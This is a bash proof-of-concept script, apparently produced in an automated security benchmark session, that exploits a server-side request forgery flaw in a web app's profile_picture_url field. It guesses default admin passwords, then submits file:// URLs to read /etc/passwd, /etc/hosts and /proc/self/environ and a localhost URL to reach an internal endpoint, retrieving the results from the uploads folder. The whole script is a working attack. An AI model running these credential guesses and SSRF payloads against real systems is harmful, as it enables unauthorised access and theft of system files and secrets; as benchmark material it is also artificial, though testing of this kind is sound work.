#!/bin/bash
# POC: SSRF POC attempting to read files via file:// protocol and access localhost endpoints
# Target: ./repo
# Created: 2025-11-04T19:41:14.882Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# SSRF Vulnerability POC - profile_picture_url Parameter (Version 2)
# Demonstrates arbitrary file read via file:// protocol and http://localhost access

TARGET="http://localhost:5000"
COOKIES_FILE="/tmp/ssrf_cookies_v2.txt"

echo "[*] SSRF POC - profile_picture_url Parameter"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Try multiple common credentials to login
echo "[+] Step 1: Attempting to authenticate..."

# Try default credentials
for CREDS in "admin:admin" "admin:password" "admin:123456" "test:test"; do
    USERNAME=$(echo $CREDS | cut -d: -f1)
    PASSWORD=$(echo $CREDS | cut -d: -f2)
    
    curl -s -c "$COOKIES_FILE" -X POST "$TARGET/login" \
      -d "username=$USERNAME&password=$PASSWORD" \
      -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1
    
    # Check if we got a session cookie
    if grep -q "session" "$COOKIES_FILE" 2>/dev/null; then
        echo "[✓] Successfully authenticated with $USERNAME:$PASSWORD"
        AUTHENTICATED=1
        break
    fi
done

if [ "$AUTHENTICATED" != "1" ]; then
    echo "[-] Could not authenticate with standard credentials"
    echo "[*] Attempting SSRF tests anyway (may not work without auth)..."
fi

echo ""
echo "[+] Step 2: Testing SSRF - Attempt to read /etc/passwd via file:// protocol"
RESP=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "first_name=Test&last_name=User&email=test@test.com&profile_picture_url=file:///etc/passwd" \
  -w "\n%{http_code}" 2>&1)

HTTP_CODE=$(echo "$RESP" | tail -n1)
BODY=$(echo "$RESP" | head -n-1)

echo "[*] Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[✓] Server accepted file:// URL request (HTTP $HTTP_CODE)"
    if echo "$BODY" | grep -q "root:\|bin/bash"; then
        echo "[✓] VULNERABLE: /etc/passwd content detected in response!"
    else
        # Try to access the uploaded file
        sleep 1
        PASSWD=$(curl -s "$TARGET/static/uploads/passwd" 2>/dev/null)
        if echo "$PASSWD" | grep -q "root:"; then
            echo "[✓] VULNERABLE: /etc/passwd successfully read and stored!"
        fi
    fi
else
    echo "[!] Server returned HTTP $HTTP_CODE - may have blocked the request"
fi

echo ""
echo "[+] Step 3: Testing SSRF - Attempt to read /etc/hosts via file:// protocol"
RESP=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "profile_picture_url=file:///etc/hosts" \
  -w "\n%{http_code}" 2>&1)

HTTP_CODE=$(echo "$RESP" | tail -n1)

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[✓] Server accepted file:// URL request (HTTP $HTTP_CODE)"
    sleep 1
    HOSTS=$(curl -s "$TARGET/static/uploads/hosts" 2>/dev/null)
    if echo "$HOSTS" | grep -q "localhost\|127.0.0.1"; then
        echo "[✓] VULNERABLE: /etc/hosts successfully read!"
    fi
fi

echo ""
echo "[+] Step 4: Testing HTTP SSRF - Attempt to access http://localhost:5000/login"
RESP=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "profile_picture_url=http://localhost:5000/login" \
  -w "\n%{http_code}" 2>&1)

HTTP_CODE=$(echo "$RESP" | tail -n1)

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[✓] Server accepted http://localhost URL request (HTTP $HTTP_CODE)"
    sleep 1
    LOGIN_PAGE=$(curl -s "$TARGET/static/uploads/login" 2>/dev/null)
    if echo "$LOGIN_PAGE" | grep -q "<form\|<html\|login"; then
        echo "[✓] VULNERABLE: Internal endpoint content accessed via SSRF!"
    fi
fi

echo ""
echo "[+] Step 5: Testing environment variable access via /proc/self/environ"
RESP=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "profile_picture_url=file:////proc/self/environ" \
  -w "\n%{http_code}" 2>&1)

HTTP_CODE=$(echo "$RESP" | tail -n1)

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[✓] Server accepted /proc/self/environ request (HTTP $HTTP_CODE)"
    sleep 1
    ENVIRON=$(curl -s "$TARGET/static/uploads/environ" 2>/dev/null)
    if [ ! -z "$ENVIRON" ]; then
        echo "[✓] VULNERABLE: Environment variables potentially exposed!"
    fi
fi

# Cleanup
rm -f "$COOKIES_FILE"

echo ""
echo "[*] POC Test Complete"
echo "[!] Vulnerability Status:"
echo "    - If any HTTP 200/302 responses were received for file:// or http://localhost,"
echo "    - and content was accessible, the SSRF vulnerability is CONFIRMED"